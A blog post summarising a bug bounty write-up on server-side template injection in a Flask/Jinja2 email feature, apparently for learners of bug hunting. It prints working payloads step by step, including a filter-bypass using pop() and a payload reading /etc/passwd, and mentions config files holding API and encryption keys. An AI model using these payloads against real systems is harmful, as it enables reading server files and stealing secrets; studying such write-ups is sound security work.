---
layout: post
title:  Bug-Bounty-Writeups-Summary-4
date:   2019-10-31
categories: Bug-Bounty-Writeups-Summarry
comments: false
---
Hello friends, Here is Part 4 of Bug Hunting Writeup Summary ->

<h3 id="httpsmedium.comakshukatkarrce-with-flask-jinja-template-injection-ea5d0201b870">1. https://medium.com/<span class="citation" data-cites="akshukatkar/rce-with-flask-jinja-template-injection-ea5d0201b870">@akshukatkar/rce-with-flask-jinja-template-injection-ea5d0201b870</span></h3>
<p>RCE with Flask Jinja Template Injection - By Akshay Katkar</p>
<p>Well, this is very awesome writeup and we can learn RCE using flask jinja template injection.</p>
<p>Here is the Key Learn from writeup -&gt;</p>
<ul>
<li><p>The program which he got was private , and had not large scope, just a single app with lots of features to test</p></li>
<li><p>First, The Author tried to know Technology used by Target using “<strong>Wappalyzer</strong>” add-on</p></li>
<li><p>The Target was using Angular dart , python Django &amp; flask</p></li>
<li><p>So, whenever we see python related technologies like Flask and Django , we must try flask ninja template injection as a TRY</p></li>
<li><p>The author knows Python very well and having a good experience with it, and know where developer makes mistake</p></li>
<li><p>The Target have One <strong>Utility</strong> named as <strong>work flow builder</strong>, which is use to build a financial close process flow. We can Automate daily activities with it like sending approval &amp; sending reminder emails</p></li>
<li><p>Sending Email Functionality , Author said that most of the times e<strong>mail generator apps</strong> are <strong>vulnerable</strong> to <strong>Template Injection</strong></p></li>
<li><p>Author thought of target sing Jinja2 template as target was built with Python</p></li>
<li><p>Send Email functions have 3 Fields -&gt;<br></p></li>
</ul>
<ol type="a">
<li>To<br></li>
<li>Title<br></li>
<li>Description<br></li>
</ol>
<ul>
<li><p>He used Payload -&gt; <code>{{7*7}}</code> in <strong>Title</strong> and <strong>Description</strong> field and click on send email buttion.</p></li>
<li><p>He got email as <strong>“49”</strong> in Subject and <code>{{7*7}}</code> as Description. That mean Subject field is vulnerable to Template Injection</p></li>
</ul>
<p><img src="https://miro.medium.com/max/1111/1*DPLFosKmDKcxqKSkw9J2Zw.png" /></p>
<p><br></p>
<ul>
<li><p><code>{{7 * 7}}</code> -&gt; what this doing is evaluating python code inside curly brackets</p></li>
<li><p>Now, he tried another payload to get list of sub classes of object class</p></li>
</ul>
<p><code>Payload : {{ [].__class__.__base__.__subclasses__() }}</code> <br><br> Response He got like this -&gt;<br></p>
<p><img src="https://miro.medium.com/max/1509/1*k__m6Ah1EvCEmDL-18aecQ.png" /></p>
<p><br><br></p>
<ul>
<li>Now, the best part is Author explain the code above he used -&gt;</li>
</ul>
<pre><code>1. []  
This is used to create list in Python

2. [].__class__
&lt;type &#39;list&#39;&gt;   #return class of list

List is sub class of “object” class.

3. Access sub classes of object class .

[].__class__.__base__.__subclasses__()
[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;.....

This payload gives us a list of all sub classes “object” class.
</code></pre>
<p><br><br> * Now to make this vulnerability to P1 he need to provide POC of using commands like ‘/etc/passwd’ , ‘id’, ‘whoami’ etc <br></p>
<ul>
<li>Author told us that -&gt; <br></li>
</ul>
<p>“<strong>Most of django apps have config file which contains really sensitive info like AWS keys , API’s &amp; encryption keys.</strong>”</p>
<p><br></p>
<ul>
<li><p>Author already knew path of config file becuase of his previous findings, So for this writeup POC, he decided to read a file. [/etc/passwd] <br></p></li>
<li><p>So, to read a file in Python we have to create object of <strong>“file”</strong>.</p></li>
</ul>
<p><code>[].__class__.__base__.__subclasses__().index(file) 40  #return index of "file" object</code></p>
<p>this payload in python interpreter we will get index of “file” object</p>
<p><br></p>
<ul>
<li>When he tried that payload didn’t work. He got error like this -&gt;<br><br></li>
</ul>
<p><img src="https://miro.medium.com/max/1075/1*CLXJs210jIR0nQXjTT2cjw.png" /></p>
<p><br></p>
<ul>
<li>Next he tried to directly access file object like this -&gt; <code>{{[].__class__.__base__.__subclasses__()[40] }}</code> <br></li>
</ul>
<p>But again failed.</p>
<ul>
<li><p>It’s mean Payload is breaking somewhere.After some try he concluded that may be indexing is block or breaking his payload</p></li>
<li><p>So, Author now told us that in Python to return a value of list “pop” method is use. As example -&gt;</p></li>
</ul>
<p><br></p>
<pre><code>    &gt;&gt;&gt; [1,2,3,4,5].pop(2) 
     3</code></pre>
<ul>
<li><p>Base on that he created payload like -&gt;</p>
<pre><code>  {{[].__class__.__base__.__subclasses__().pop(40) }}</code></pre></li>
</ul>
<p>That payload gave object of <strong>“file”</strong></p>
<p><br></p>
<p><img src="https://miro.medium.com/max/1239/1*WqZboWvRQfrEbRQeBR2sIg.png" /> <br></p>
<ul>
<li><p>Now for read “/etc/passwd” -&gt;</p>
<pre><code>  {{[].__class__.__base__.__subclasses__().pop(40)(&#39;etc/passwd&#39;).read() }}</code></pre></li>
</ul>
<p><img src="https://miro.medium.com/max/1114/1*QpfhUYMZ5Unug8qzu69KFA.png" /> <br></p>
<ul>
<li><p>So, now we can read “/etc/passwd” file on server.</p></li>
<li><p>Now author can read local files on the GCE instance responsible for sending notifications, including some source code, and configuration files containing very sensitive values (e.g. API and encryption keys). <br></p></li>
</ul>
<p>This is very superb writeup by Akshay Katkar, We learn many things from this writeup</p>
<p><br></p>
<p>Like , first anyalyze the target technologies, understand the application functionalities, understand python usages for read file and when stuck tried some experiments instead of giving up.</p>
